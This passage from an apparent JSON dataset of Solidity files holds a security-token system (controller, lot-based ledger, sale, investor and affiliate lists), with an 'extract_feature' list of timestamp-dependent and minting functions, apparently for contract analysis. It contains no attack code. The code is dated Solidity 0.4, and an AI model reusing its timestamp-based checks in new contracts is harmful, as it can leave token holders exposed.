IInvestorList(_investorList);\n }\n function setTransferAuthorizations(address _transferAuthorizations) public onlyOwner {\n transferAuthorizations = ITransferAuthorizations(_transferAuthorizations);\n }\n function setAffiliateList(address _affiliateList) public onlyOwner {\n affiliateList = IAffiliateList(_affiliateList);\n }\n function setDependencies(address _token, address _ledger, address _sale,\n address _investorList, address _transferAuthorizations, address _affiliateList)\n public onlyOwner\n {\n token = ISecurityToken(_token);\n ledger = ISecurityLedger(_ledger);\n sale = ISecuritySale(_sale);\n investorList = IInvestorList(_investorList);\n transferAuthorizations = ITransferAuthorizations(_transferAuthorizations);\n affiliateList = IAffiliateList(_affiliateList);\n }\n function setTransferAuthPermission(address agent, bool hasPermission) public onlyOwner {\n require(agent != address(0));\n transferAuthPermission[agent] = hasPermission;\n }\n modifier onlyToken() {\n require(msg.sender == address(token));\n _;\n }\n modifier onlyLedger() {\n require(msg.sender == address(ledger));\n _;\n }\n function totalSupply() public view returns (uint) {\n return ledger.totalSupply();\n }\n function balanceOf(address _a) public view returns (uint) {\n return ledger.balanceOf(_a);\n }\n function allowance(address _owner, address _spender) public view returns (uint) {\n return ledger.allowance(_owner, _spender);\n }\n function isTransferAuthorized(address _from, address _to) public view returns (bool) {\n uint expiry = transferAuthorizations.get(_from, _to);\n uint globalExpiry = transferAuthorizations.get(_from, 0);\n if(globalExpiry > expiry) {\n expiry = globalExpiry;\n }\n return expiry > block.timestamp;\n }\n function checkTransfer(address _from, address _to, uint _value, uint lockoutTime)\n public\n returns (bool canTransfer, bool useLockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) {\n preservePurchaseDate = false;\n bool transferIsAuthorized = isTransferAuthorized(_from, _to);\n bool fromIsAffiliate = affiliateList.inListAsOf(_from, block.timestamp);\n bool toIsAffiliate = affiliateList.inListAsOf(_to, block.timestamp);\n if(transferIsAuthorized) {\n canTransfer = true;\n if(fromIsAffiliate || toIsAffiliate) {\n newTokensAreRestricted = true;\n }\n }\n else if(!fromIsAffiliate) {\n if(investorList.hasRole(_from, investorList.ROLE_REGS())\n && investorList.hasRole(_to, investorList.ROLE_REGS())) {\n canTransfer = true;\n }\n else {\n if(ledger.transferDryRun(_from, _to, _value, lockoutTime) == _value) {\n canTransfer = true;\n useLockoutTime = true;\n }\n }\n }\n }\n function ledgerTransfer(address from, address to, uint val) public onlyLedger {\n token.controllerTransfer(from, to, val);\n }\n function transfer(address _from, address _to, uint _value) public onlyToken returns (bool success) {\n uint lockoutTime = block.timestamp - lockoutPeriod;\n bool canTransfer;\n bool useLockoutTime;\n bool newTokensAreRestricted;\n bool preservePurchaseDate;\n (canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)\n = checkTransfer(_from, _to, _value, lockoutTime);\n if(!canTransfer) {\n return false;\n }\n uint overrideLockoutTime = lockoutTime;\n if(!useLockoutTime) {\n overrideLockoutTime = 0;\n }\n return ledger.transfer(_from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);\n }\n function transferFrom(address _spender, address _from, address _to, uint _value) public onlyToken returns (bool success) {\n uint lockoutTime = block.timestamp - lockoutPeriod;\n bool canTransfer;\n bool useLockoutTime;\n bool newTokensAreRestricted;\n bool preservePurchaseDate;\n (canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)\n = checkTransfer(_from, _to, _value, lockoutTime);\n if(!canTransfer) {\n return false;\n }\n uint overrideLockoutTime = lockoutTime;\n if(!useLockoutTime) {\n overrideLockoutTime = 0;\n }\n return ledger.transferFrom(_spender, _from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);\n }\n function approve(address _owner, address _spender, uint _value) public onlyToken returns (bool success) {\n return ledger.approve(_owner, _spender, _value);\n }\n function increaseApproval (address _owner, address _spender, uint _addedValue) public onlyToken returns (bool success) {\n return ledger.increaseApproval(_owner, _spender, _addedValue);\n }\n function decreaseApproval (address _owner, address _spender, uint _subtractedValue) public onlyToken returns (bool success) {\n return ledger.decreaseApproval(_owner, _spender, _subtractedValue);\n }\n function burn(address _owner, uint _amount) public onlyToken {\n ledger.burn(_owner, _amount);\n }\n}\ninterface ISecurityLedger {\n function balanceOf(address _a) external view returns (uint);\n function totalSupply() external view returns (uint);\n function transferDryRun(address _from, address _to, uint amount, uint lockoutTime) external returns (uint transferrableCount);\n function transfer(address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) external returns (bool success);\n function transferFrom(address _spender, address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) external returns (bool success);\n function allowance(address _owner, address _spender) external view returns (uint);\n function approve(address _owner, address _spender, uint _value) external returns (bool success);\n function increaseApproval(address _owner, address _spender, uint _addedValue) external returns (bool success);\n function decreaseApproval(address _owner, address _spender, uint _subtractedValue) external returns (bool success);\n function burn(address _owner, uint _amount) external;\n function setController(address _controller) external;\n}\ncontract SecurityLedger is Ownable {\n using SafeMath for uint256;\n struct TokenLot {\n uint amount;\n uint purchaseDate;\n bool restricted;\n }\n mapping(address => TokenLot[]) public tokenLotsOf;\n SecurityController public controller;\n mapping(address => uint) public balanceOf;\n mapping (address => mapping (address => uint)) public allowance;\n uint public totalSupply;\n uint public mintingNonce;\n bool public mintingStopped;\n constructor() public {\n }\n function setController(address _controller) public onlyOwner {\n controller = SecurityController(_controller);\n }\n function stopMinting() public onlyOwner {\n mintingStopped = true;\n }\n function mint(address addr, uint value, uint timestamp) public onlyOwner {\n require(!mintingStopped);\n uint time = timestamp;\n if(time == 0) {\n time = block.timestamp;\n }\n balanceOf[addr] = balanceOf[addr].add(value);\n tokenLotsOf[addr].push(TokenLot(value, time, true));\n controller.ledgerTransfer(0, addr, value);\n totalSupply = totalSupply.add(value);\n }\n function multiMint(uint nonce, uint256[] bits, uint timestamp) external onlyOwner {\n require(!mintingStopped);\n if (nonce != mintingNonce) return;\n mintingNonce = mintingNonce.add(1);\n uint256 lomask = (1 << 96) - 1;\n uint created = 0;\n uint time = timestamp;\n if(time == 0) {\n time = block.timestamp;\n }\n for (uint i = 0; i < bits.length; i++) {\n address addr = address(bits[i]>>96);\n uint value = bits[i] & lomask;\n balanceOf[addr] = balanceOf[addr].add(value);\n tokenLotsOf[addr].push(TokenLot(value, time, true));\n controller.ledgerTransfer(0, addr, value);\n created = created.add(value);\n }\n totalSupply = totalSupply.add(created);\n }\n function sendReceivedTokens(address token, address sender, uint amount) public onlyOwner {\n ERC20Basic t = ERC20Basic(token);\n require(t.transfer(sender, amount));\n }\n modifier onlyController() {\n require(msg.sender == address(controller));\n _;\n }\n function walkTokenLots(address from, address to, uint amount, uint lockoutTime, bool removeTokens,\n bool newTokensAreRestricted, bool preservePurchaseDate)\n internal returns (uint numTransferrableTokens)\n {\n TokenLot[] storage fromTokenLots = tokenLotsOf[from];\n for(uint i=0; i<fromTokenLots.length; i++) {\n TokenLot storage lot = fromTokenLots[i];\n uint lotAmount = lot.amount;\n if(lotAmount == 0) {\n continue;\n }\n if(lockoutTime > 0) {\n if(lot.restricted && lot.purchaseDate > lockoutTime) {\n continue;\n }\n }\n uint remaining = amount.sub(numTransferrableTokens);\n if(lotAmount >= remaining) {\n numTransferrableTokens = numTransferrableTokens.add(remaining);\n if(removeTokens) {\n lot.amount = lotAmount.sub(remaining);\n if(to != address(0)) {\n if(preservePurchaseDate) {\n tokenLotsOf[to].push(TokenLot(remaining, lot.purchaseDate, newTokensAreRestricted));\n }\n else {\n tokenLotsOf[to].push(TokenLot(remaining, block.timestamp, newTokensAreRestricted));\n }\n }\n }\n break;\n }\n numTransferrableTokens = numTransferrableTokens.add(lotAmount);\n if(removeTokens) {\n lot.amount = 0;\n if(to != address(0)) {\n if(preservePurchaseDate) {\n tokenLotsOf[to].push(TokenLot(lotAmount, lot.purchaseDate, newTokensAreRestricted));\n }\n else {\n tokenLotsOf[to].push(TokenLot(lotAmount, block.timestamp, newTokensAreRestricted));\n }\n }\n }\n }\n }\n function transferDryRun(address from, address to, uint amount, uint lockoutTime) public onlyController returns (uint) {\n return walkTokenLots(from, to, amount, lockoutTime, false, false, false);\n }\n function transfer(address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) public onlyController returns (bool success) {\n if (balanceOf[_from] < _value) return false;\n uint tokensTransferred = walkTokenLots(_from, _to, _value, lockoutTime, true, newTokensAreRestricted, preservePurchaseDate);\n require(tokensTransferred == _value);\n balanceOf[_from] = balanceOf[_from].sub(_value);\n balanceOf[_to] = balanceOf[_to].add(_value);\n return true;\n }\n function transferFrom(address _spender, address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) public onlyController returns (bool success) {\n if (balanceOf[_from] < _value) return false;\n uint allowed = allowance[_from][_spender];\n if (allowed < _value) return false;\n uint tokensTransferred = walkTokenLots(_from, _to, _value, lockoutTime, true, newTokensAreRestricted, preservePurchaseDate);\n require(tokensTransferred == _value);\n balanceOf[_from] = balanceOf[_from].sub(_value);\n balanceOf[_to] = balanceOf[_to].add(_value);\n allowance[_from][_spender] = allowed.sub(_value);\n return true;\n }\n function approve(address _owner, address _spender, uint _value) public onlyController returns (bool success) {\n if ((_value != 0) && (allowance[_owner][_spender] != 0)) {\n return false;\n }\n allowance[_owner][_spender] = _value;\n return true;\n }\n function increaseApproval (address _owner, address _spender, uint _addedValue) public onlyController returns (bool success) {\n uint oldValue = allowance[_owner][_spender];\n allowance[_owner][_spender] = oldValue.add(_addedValue);\n return true;\n }\n function decreaseApproval (address _owner, address _spender, uint _subtractedValue) public onlyController returns (bool success) {\n uint oldValue = allowance[_owner][_spender];\n if (_subtractedValue > oldValue) {\n allowance[_owner][_spender] = 0;\n } else {\n allowance[_owner][_spender] = oldValue.sub(_subtractedValue);\n }\n return true;\n }\n function burn(address _owner, uint _amount) public onlyController {\n require(balanceOf[_owner] >= _amount);\n balanceOf[_owner] = balanceOf[_owner].sub(_amount);\n walkTokenLots(_owner, address(0), _amount, 0, true, false, false);\n totalSupply = totalSupply.sub(_amount);\n }\n}\ninterface ISecuritySale {\n function setLive(bool newLiveness) external;\n function setInvestorList(address _investorList) external;\n}\ncontract SecuritySale is Ownable {\n bool public live;\n IInvestorList public investorList;\n event SaleLive(bool liveness);\n event EtherIn(address from, uint amount);\n event StartSale();\n event EndSale();\n constructor() public {\n live = false;\n }\n function setInvestorList(address _investorList) public onlyOwner {\n investorList = IInvestorList(_investorList);\n }\n function () public payable {\n require(live);\n require(investorList.inList(msg.sender));\n emit EtherIn(msg.sender, msg.value);\n }\n function setLive(bool newLiveness) public onlyOwner {\n if(live && !newLiveness) {\n live = false;\n emit EndSale();\n }\n else if(!live && newLiveness) {\n live = true;\n emit StartSale();\n }\n }\n function withdraw() public onlyOwner {\n msg.sender.transfer(address(this).balance);\n }\n function withdrawSome(uint value) public onlyOwner {\n require(value <= address(this).balance);\n msg.sender.transfer(value);\n }\n function withdrawTokens(address token) public onlyOwner {\n ERC20Basic t = ERC20Basic(token);\n require(t.transfer(msg.sender, t.balanceOf(this)));\n }\n function sendReceivedTokens(address token, address sender, uint amount) public onlyOwner {\n ERC20Basic t = ERC20Basic(token);\n require(t.transfer(sender, amount));\n }\n}\ninterface ISecurityToken {\n function balanceOf(address addr) external view returns(uint);\n function transfer(address to, uint amount) external returns(bool);\n function controllerTransfer(address _from, address _to, uint _value) external;\n}\ncontract SecurityToken is Ownable{\n using SafeMath for uint256;\n ISecurityController public controller;\n string public name;\n string public symbol;\n uint8 public decimals;\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n constructor(string _name, string _symbol, uint8 _decimals) public {\n name = _name;\n symbol = _symbol;\n decimals = _decimals;\n }\n function setName(string _name) public onlyOwner {\n name = _name;\n }\n function setSymbol(string _symbol) public onlyOwner {\n symbol = _symbol;\n }\n function setController(address _c) public onlyOwner {\n controller = ISecurityController(_c);\n }\n function sendReceivedTokens(address token, address sender, uint amount) public onlyOwner {\n ERC20Basic t = ERC20Basic(token);\n require(t.transfer(sender, amount));\n }\n function balanceOf(address a) public view returns (uint) {\n return controller.balanceOf(a);\n }\n function totalSupply() public view returns (uint) {\n return controller.totalSupply();\n }\n function allowance(address _owner, address _spender) public view returns (uint) {\n return controller.allowance(_owner, _spender);\n }\n function burn(uint _amount) public {\n controller.burn(msg.sender, _amount);\n emit Transfer(msg.sender, 0x0, _amount);\n }\n modifier onlyPayloadSize(uint numwords) {\n assert(msg.data.length >= numwords.mul(32).add(4));\n _;\n }\n function isTransferAuthorized(address _from, address _to) public onlyPayloadSize(2) view returns (bool) {\n return controller.isTransferAuthorized(_from, _to);\n }\n function transfer(address _to, uint _value) public onlyPayloadSize(2) returns (bool success) {\n if (controller.transfer(msg.sender, _to, _value)) {\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n return false;\n }\n function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3) returns (bool success) {\n if (controller.transferFrom(msg.sender, _from, _to, _value)) {\n emit Transfer(_from, _to, _value);\n return true;\n }\n return false;\n }\n function approve(address _spender, uint _value) onlyPayloadSize(2) public returns (bool success) {\n if (controller.approve(msg.sender, _spender, _value)) {\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n return false;\n }\n function increaseApproval (address _spender, uint _addedValue) public onlyPayloadSize(2) returns (bool success) {\n if (controller.increaseApproval(msg.sender, _spender, _addedValue)) {\n uint newval = controller.allowance(msg.sender, _spender);\n emit Approval(msg.sender, _spender, newval);\n return true;\n }\n return false;\n }\n function decreaseApproval (address _spender, uint _subtractedValue) public onlyPayloadSize(2) returns (bool success) {\n if (controller.decreaseApproval(msg.sender, _spender, _subtractedValue)) {\n uint newval = controller.allowance(msg.sender, _spender);\n emit Approval(msg.sender, _spender, newval);\n return true;\n }\n return false;\n }\n modifier onlyController() {\n assert(msg.sender == address(controller));\n _;\n }\n function controllerTransfer(address _from, address _to, uint _value) public onlyController {\n emit Transfer(_from, _to, _value);\n }\n function controllerApprove(address _owner, address _spender, uint _value) public onlyController {\n emit Approval(_owner, _spender, _value);\n }\n}\ninterface ITransferAuthorizations {\n function setController(address _controller) external;\n function get(address from, address to) external view returns (uint);\n function set(address from, address to, uint expiry) external;\n}\ncontract TransferAuthorizations is Ownable, ITransferAuthorizations {\n mapping(address => mapping(address => uint)) public authorizations;\n address public controller;\n event TransferAuthorizationSet(address from, address to, uint expiry);\n function setController(address _controller) public onlyOwner {\n controller = _controller;\n }\n modifier onlyController() {\n assert(msg.sender == controller);\n _;\n }\n function set(address from, address to, uint expiry) public onlyController {\n require(from != 0);\n authorizations[from][to] = expiry;\n emit TransferAuthorizationSet(from, to, expiry);\n }\n function get(address from, address to) public view returns (uint) {\n return authorizations[from][to];\n }\n}",
  "extract_feature": [
    "function setTransferAuthorized(address from, address to, uint expiry) public {\nrequire(transferAuthPermission[msg.sender]);\nrequire(from != 0);\nif(expiry > 0) {\nrequire(expiry > block.timestamp);\nrequire(expiry <= (block.timestamp + 30 days));\n}\ntransferAuthorizations.set(from, to, expiry);\n}",
    "function isTransferAuthorized(address _from, address _to) public view returns (bool) {\nuint expiry = transferAuthorizations.get(_from, _to);\nuint globalExpiry = transferAuthorizations.get(_from, 0);\nif(globalExpiry > expiry) {\nexpiry = globalExpiry;\n}\nreturn expiry > block.timestamp;\n}",
    "function transfer(address _from, address _to, uint _value) public onlyToken returns (bool success) {\nuint lockoutTime = block.timestamp - lockoutPeriod;\nbool canTransfer;\nbool useLockoutTime;\nbool newTokensAreRestricted;\nbool preservePurchaseDate;\n(canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)\n= checkTransfer(_from, _to, _value, lockoutTime);\nif(!canTransfer) {\nreturn false;\n}\nuint overrideLockoutTime = lockoutTime;\nif(!useLockoutTime) {\noverrideLockoutTime = 0;\n}\nreturn ledger.transfer(_from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);\n}",
    "function transferFrom(address _spender, address _from, address _to, uint _value) public onlyToken returns (bool success) {\nuint lockoutTime = block.timestamp - lockoutPeriod;\nbool canTransfer;\nbool useLockoutTime;\nbool newTokensAreRestricted;\nbool preservePurchaseDate;\n(canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)\n= checkTransfer(_from, _to, _value, lockoutTime);\nif(!canTransfer) {\nreturn false;\n}\nuint overrideLockoutTime = lockoutTime;\nif(!useLockoutTime) {\noverrideLockoutTime = 0;\n}\nreturn ledger.transferFrom(_spender, _from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);\n}",
    "function mint(address addr, uint value, uint timestamp) public onlyOwner {\nrequire(!mintingStopped);\nuint time = timestamp;\nif(time == 0) {\ntime = block.timestamp;\n}\nbalanceOf[addr] = balanceOf[addr].add(value);\ntokenLotsOf[addr].push(TokenLot(value, time, true));\ncontroller.ledgerTransfer(0, addr, value);\ntotalSupply = totalSupply.add(value);\n}",
    "function multiMint(uint nonce, uint256[] bits, uint timestamp) external onlyOwner {\nrequire(!mintingStopped);\nif (nonce != mintingNonce) return;\nmintingNonce = mintingNonce.add(1);\nuint256 lomask = (1 << 96) - 1;\nuint created = 0;\nuint time = timestamp;\nif(time == 0) {\ntime = block.timestamp;\n}\nfor (uint i = 0; i < bits.length; i++) {\naddress addr = address(bits[i]>>96);\nuint value = bits[i] & lomask;\nbalanceOf[addr] = balanceOf[addr].add(value);\ntokenLotsOf[addr].push(TokenLot(value, time, true));\ncontroller.ledgerTransfer(0, addr, value);\ncreated = created.add(value);\n}\ntotalSupply = totalSupply.add(created);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f7e"
  },
  "filename": "9360.sol",
  "content": "pragma solidity ^0.4.13;\ninterface IAffiliateList {\n function set(address addr, uint startTimestamp, uint endTimestamp) external;\n function get(address addr) external view returns (uint start, uint end);\n function inListAsOf(address addr, uint time) external view returns (bool);\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract IInvestorList {\n string public constant ROLE_REGD = \"regd\";\n string public constant ROLE_REGCF = \"regcf\";\n string public constant ROLE_REGS = \"regs\";\n string public constant ROLE_UNKNOWN = \"unknown\";\n function inList(address addr) public view returns (bool);\n function addAddress(address addr, string role) public;\n function getRole(address addr) public view returns (string);\n function hasRole(address addr, string role) public view returns (bool);\n}\ncontract Ownable {\n address public owner;\n address public newOwner;\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function changeOwner(address _newOwner) public onlyOwner {\n newOwner = _newOwner;\n }\n function acceptOwnership() public {\n if (msg.sender == newOwner) {\n owner = newOwner;\n newOwner = 0;\n }\n }\n}\ncontract AffiliateList is Ownable, IAffiliateList {\n event AffiliateAdded(address addr, uint startTimestamp, uint endTimestamp);\n event AffiliateUpdated(address addr, uint startTimestamp, uint endTimestamp);\n mapping (address => uint) public affiliateStart;\n mapping (address => uint) public affiliateEnd;\n function set(address addr, uint startTimestamp, uint endTimestamp) public onlyOwner {\n require(addr != address(0));\n uint existingStart = affiliateStart[addr];\n if(existingStart == 0) {\n require(startTimestamp != 0);\n affiliateStart[addr] = startTimestamp;\n if(endTimestamp != 0) {\n require(endTimestamp > startTimestamp);\n affiliateEnd[addr] = endTimestamp;\n }\n emit AffiliateAdded(addr, startTimestamp, endTimestamp);\n }\n else {\n if(startTimestamp == 0) {\n if(endTimestamp == 0) {\n affiliateStart[addr] = 0;\n affiliateEnd[addr] = 0;\n }\n else {\n require(endTimestamp > existingStart);\n }\n }\n else {\n affiliateStart[addr] = startTimestamp;\n if(endTimestamp != 0) {\n require(endTimestamp > startTimestamp);\n }\n }\n affiliateEnd[addr] = endTimestamp;\n emit AffiliateUpdated(addr, startTimestamp, endTimestamp);\n }\n }\n function get(address addr) public view returns (uint start, uint end) {\n return (affiliateStart[addr], affiliateEnd[addr]);\n }\n function inListAsOf(address addr, uint time) public view returns (bool) {\n uint start;\n uint end;\n (start, end) = get(addr);\n if(start == 0) {\n return false;\n }\n if(time < start) {\n return false;\n }\n if(end != 0 && time >= end) {\n return false;\n }\n return true;\n }\n}\ncontract InvestorList is Ownable, IInvestorList {\n event AddressAdded(address addr, string role);\n event AddressRemoved(address addr, string role);\n mapping (address => string) internal investorList;\n modifier validRole(string role) {\n require(\n keccak256(bytes(role)) == keccak256(bytes(ROLE_REGD)) ||\n keccak256(bytes(role)) == keccak256(bytes(ROLE_REGCF)) ||\n keccak256(bytes(role)) == keccak256(bytes(ROLE_REGS)) ||\n keccak256(bytes(role)) == keccak256(bytes(ROLE_UNKNOWN))\n );\n _;\n }\n function inList(address addr)\n public\n view\n returns (bool)\n {\n if (bytes(investorList[addr]).length != 0) {\n return true;\n } else {\n return false;\n }\n }\n function getRole(address addr)\n public\n view\n returns (string)\n {\n require(inList(addr));\n return investorList[addr];\n }\n function hasRole(address addr, string role)\n public\n view\n returns (bool)\n {\n return keccak256(bytes(role)) == keccak256(bytes(investorList[addr]));\n }\n function addAddress(address addr, string role)\n onlyOwner\n validRole(role)\n public\n {\n investorList[addr] = role;\n emit AddressAdded(addr, role);\n }\n function addAddresses(address[] addrs, string role)\n onlyOwner\n validRole(role)\n public\n {\n for (uint256 i = 0; i < addrs.length; i++) {\n addAddress(addrs[i], role);\n }\n }\n function removeAddress(address addr)\n onlyOwner\n public\n {\n require(inList(addr));\n string memory role = investorList[addr];\n investorList[addr] = \"\";\n emit AddressRemoved(addr, role);\n }\n function removeAddresses(address[] addrs)\n onlyOwner\n public\n {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (inList(addrs[i])) {\n removeAddress(addrs[i]);\n }\n }\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ISecurityController {\n function balanceOf(address _a) public view returns (uint);\n function totalSupply() public view returns (uint);\n function isTransferAuthorized(address _from, address _to) public view returns (bool);\n function setTransferAuthorized(address from, address to, uint expiry) public;\n function transfer(address _from, address _to, uint _value) public returns (bool success);\n function transferFrom(address _spender, address _from, address _to, uint _value) public returns (bool success);\n function allowance(address _owner, address _spender) public view returns (uint);\n function approve(address _owner, address _spender, uint _value) public returns (bool success);\n function increaseApproval(address _owner, address _spender, uint _addedValue) public returns (bool success);\n function decreaseApproval(address _owner, address _spender, uint _subtractedValue) public returns (bool success);\n function burn(address _owner, uint _amount) public;\n function ledgerTransfer(address from, address to, uint val) public;\n function setLedger(address _ledger) public;\n function setSale(address _sale) public;\n function setToken(address _token) public;\n function setAffiliateList(address _affiliateList) public;\n}\ncontract SecurityController is ISecurityController, Ownable {\n ISecurityLedger public ledger;\n ISecurityToken public token;\n ISecuritySale public sale;\n IInvestorList public investorList;\n ITransferAuthorizations public transferAuthorizations;\n IAffiliateList public affiliateList;\n uint public lockoutPeriod = 10 * 60 * 60;\n mapping(address => bool) public transferAuthPermission;\n constructor() public {\n }\n function setTransferAuthorized(address from, address to, uint expiry) public {\n require(transferAuthPermission[msg.sender]);\n require(from != 0);\n if(expiry > 0) {\n require(expiry > block.timestamp);\n require(expiry <= (block.timestamp + 30 days));\n }\n transferAuthorizations.set(from, to, expiry);\n }\n function setLockoutPeriod(uint _lockoutPeriod) public onlyOwner {\n lockoutPeriod = _lockoutPeriod;\n }\n function setToken(address _token) public onlyOwner {\n token = ISecurityToken(_token);\n }\n function setLedger(address _ledger) public onlyOwner {\n ledger = ISecurityLedger(_ledger);\n }\n function setSale(address _sale) public onlyOwner {\n sale = ISecuritySale(_sale);\n }\n function setInvestorList(address _investorList) public onlyOwner {\n investorList = IInvestorList(_investorList);\n }\n function setTransferAuthorizations(address _transferAuthorizations) public onlyOwner {\n transferAuthorizations = ITransferAuthorizations(_transferAuthorizations);\n }\n function setAffiliateList(address _affiliateList) public onlyOwner {\n affiliateList = IAffiliateList(_affiliateList);\n }\n function setDependencies(address _token, address _ledger, address _sale,\n address _investorList, address _transferAuthorizations, address _affiliateList)\n public onlyOwner\n {\n token = ISecurityToken(_token);\n ledger = ISecurityLedger(_ledger);\n sale = ISecuritySale(_sale);\n investorList = IInvestorList(_investorList);\n transferAuthorizations = ITransferAuthorizations(_transferAuthorizations);\n affiliateList = IAffiliateList(_affiliateList);\n }\n function setTransferAuthPermission(address agent, bool hasPermission) public onlyOwner {\n require(agent != address(0));\n transferAuthPermission[agent] = hasPermission;\n }\n modifier onlyToken() {\n require(msg.sender == address(token));\n _;\n }\n modifier onlyLedger() {\n require(msg.sender == address(ledger));\n _;\n }\n function totalSupply() public view returns (uint) {\n return ledger.totalSupply();\n }\n function balanceOf(address _a) public view returns (uint) {\n return ledger.balanceOf(_a);\n }\n function allowance(address _owner, address _spender) public view returns (uint) {\n return ledger.allowance(_owner, _spender);\n }\n function isTransferAuthorized(address _from, address _to) public view returns (bool) {\n uint expiry = transferAuthorizations.get(_from, _to);\n uint globalExpiry = transferAuthorizations.get(_from, 0);\n if(globalExpiry > expiry) {\n expiry = globalExpiry;\n }\n return expiry > block.timestamp;\n }\n function checkTransfer(address _from, address _to, uint _value, uint lockoutTime)\n public\n returns (bool canTransfer, bool useLockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) {\n preservePurchaseDate = false;\n bool transferIsAuthorized = isTransferAuthorized(_from, _to);\n bool fromIsAffiliate = affiliateList.inListAsOf(_from, block.timestamp);\n bool toIsAffiliate = affiliateList.inListAsOf(_to, block.timestamp);\n if(transferIsAuthorized) {\n canTransfer = true;\n if(fromIsAffiliate || toIsAffiliate) {\n newTokensAreRestricted = true;\n }\n }\n else if(!fromIsAffiliate) {\n if(investorList.hasRole(_from, investorList.ROLE_REGS())\n && investorList.hasRole(_to, investorList.ROLE_REGS())) {\n canTransfer = true;\n }\n else {\n if(ledger.transferDryRun(_from, _to, _value, lockoutTime) == _value) {\n canTransfer = true;\n useLockoutTime = true;\n }\n }\n }\n }\n function ledgerTransfer(address from, address to, uint val) public onlyLedger {\n token.controllerTransfer(from, to, val);\n }\n function transfer(address _from, address _to, uint _value) public onlyToken returns (bool success) {\n uint lockoutTime = block.timestamp - lockoutPeriod;\n bool canTransfer;\n bool useLockoutTime;\n bool newTokensAreRestricted;\n bool preservePurchaseDate;\n (canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)\n = checkTransfer(_from, _to, _value, lockoutTime);\n if(!canTransfer) {\n return false;\n }\n uint overrideLockoutTime = lockoutTime;\n if(!useLockoutTime) {\n overrideLockoutTime = 0;\n }\n return ledger.transfer(_from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);\n }\n function transferFrom(address _spender, address _from, address _to, uint _value) public onlyToken returns (bool success) {\n uint lockoutTime = block.timestamp - lockoutPeriod;\n bool canTransfer;\n bool useLockoutTime;\n bool newTokensAreRestricted;\n bool preservePurchaseDate;\n (canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)\n = checkTransfer(_from, _to, _value, lockoutTime);\n if(!canTransfer) {\n return false;\n }\n uint overrideLockoutTime = lockoutTime;\n if(!useLockoutTime) {\n overrideLockoutTime = 0;\n }\n return ledger.transferFrom(_spender, _from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);\n }\n function approve(address _owner, address _spender, uint _value) public onlyToken returns (bool success) {\n return ledger.approve(_owner, _spender, _value);\n }\n function increaseApproval (address _owner, address _spender, uint _addedValue) public onlyToken returns (bool success) {\n return ledger.increaseApproval(_owner, _spender, _addedValue);\n }\n function decreaseApproval (address _owner, address _spender, uint _subtractedValue) public onlyToken returns (bool success) {\n return ledger.decreaseApproval(_owner, _spender, _subtractedValue);\n }\n function burn(address _owner, uint _amount) public onlyToken {\n ledger.burn(_owner, _amount);\n }\n}\ninterface ISecurityLedger {\n function balanceOf(address _a) external view returns (uint);\n function totalSupply() external view returns (uint);\n function transferDryRun(address _from, address _to, uint amount, uint lockoutTime) external returns (uint transferrableCount);\n function transfer(address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) external returns (bool success);\n function transferFrom(address _spender, address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) external returns (bool success);\n function allowance(address _owner, address _spender) external view returns (uint);\n function approve(address _owner, address _spender, uint _value) external returns (bool success);\n function increaseApproval(address _owner, address _spender, uint _addedValue) external returns (bool success);\n function decreaseApproval(address _owner, address _spender, uint _subtractedValue) external returns (bool success);\n function burn(address _owner, uint _amount) external;\n function setController(address _controller) external;\n}\ncontract SecurityLedger is Ownable {\n using SafeMath for uint256;\n struct TokenLot {\n uint amount;\n uint purchaseDate;\n bool restricted;\n }\n mapping(address => TokenLot[]) public tokenLotsOf;\n SecurityController public controller;\n mapping(address => uint) public balanceOf;\n mapping (address => mapping (address => uint)) public allowance;\n uint public totalSupply;\n uint public mintingNonce;\n bool public mintingStopped;\n constructor() public {\n }\n function setController(address _controller) public onlyOwner {\n controller = SecurityController(_controller);\n }\n function stopMinting() public onlyOwner {\n mintingStopped = true;\n }\n function mint(address addr, uint value, uint timestamp) public onlyOwner {\n require(!mintingStopped);\n uint time = timestamp;\n if(time == 0) {\n time = block.timestamp;\n }\n 